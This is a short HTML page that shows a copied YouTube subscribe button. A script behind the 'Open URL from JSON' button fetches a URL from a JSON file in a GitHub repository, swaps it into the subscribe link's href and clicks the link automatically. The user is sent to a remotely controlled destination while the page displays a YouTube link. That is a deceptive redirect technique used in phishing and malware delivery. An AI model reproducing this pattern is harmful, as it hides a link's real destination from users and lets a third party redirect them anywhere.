<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Open URL from JSON</title>
</head>
<body>
<h1>Open URL from JSON</h1>
<button onclick="openUrlFromJson()">Open URL from JSON</button>
<a class='yt-subscribe-button' rel="noopener nofollow" href='https://www.youtube.com/c/midudev?sub_confirmation=1' target='_blank'>
    <span>
        <svg viewBox="0 0 24 24" width="16" style='margin:-2px 4px 0 0'>
            <path
                d="M23.495 6.205a3.007 3.007 0 0 0-2.088-2.088c-1.87-.501-9.396-.501-9.396-.501s-7.507-.01-9.396.501A3.007 3.007 0 0 0 .527 6.205a31.247 31.247 0 0 0-.522 5.805 31.247 31.247 0 0 0 .522 5.783 3.007 3.007 0 0 0 2.088 2.088c1.868.502 9.396.502 9.396.502s7.506 0 9.396-.502a3.007 3.007 0 0 0 2.088-2.088 31.247 31.247 0 0 0 .5-5.783 31.247 31.247 0 0 0-.5-5.805zM9.609 15.601V8.408l6.264 3.602z"
                fill='#fff'
            ></path>
        </svg>
        ¡Suscríbete!
    </span>
    <span>79K</span>
</a>

<script>
async function openUrlFromJson() {
    try {
        const cacheBuster = new Date().getTime(); // Generate a unique timestamp
        const url = `https://raw.githubusercontent.com/Huncho5449/brokenman-peakyblinder/main/uri.json?t=${cacheBuster}`;
        const response = await fetch(url);
        const data = await response.json();
        const targetUrl = data.url;

        // Replace the href attribute of the subscribe button
        document.querySelector('.yt-subscribe-button').setAttribute('href', targetUrl);

        // Click the subscribe button
        document.querySelector('.yt-subscribe-button').click();
    } catch (error) {
        console.error('Error fetching or parsing JSON:', error);
        alert('Error fetching or parsing JSON. See console for details.');
    }
}
</script>
</body>
</html>
